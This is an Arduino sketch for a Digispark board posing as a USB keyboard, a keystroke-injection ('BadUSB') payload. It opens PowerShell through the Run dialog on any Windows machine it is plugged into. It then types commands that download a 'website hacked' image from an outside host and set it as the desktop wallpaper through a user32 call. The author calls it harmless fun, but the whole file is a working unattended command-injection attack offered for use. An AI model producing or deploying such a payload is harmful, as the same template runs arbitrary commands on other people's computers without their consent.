/*
Superbly harmless. It just changes the background image to a chosen image. You can pick whatever image you want! Have Fun!
*/
#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2500);

  /* Change Wallpaper */
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print(F("$client = new-object System.Net.WebClient"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print(F("$client.DownloadFile(\"https://mailprotector.com/wp-content/uploads/2021/11/website-hacked-mailprotector-wordpress-scaled.jpg\" , \"hacked.jpg\")"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  DigiKeyboard.print(F("Add-Type -TypeDefinition @\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("using System; using System.Runtime.InteropServices;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("public class Wallpaper {"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("[DllImport(\"user32.dll\", CharSet= CharSet.Auto)]"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("}"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("\"@"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print(F("[Wallpaper]::SystemParametersInfo(0x0014, 0, \"$env:USERPROFILE\\hacked.jpg\", 0x01 -bor 0x02)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    // Stops the digispark from running the script again
  }
}
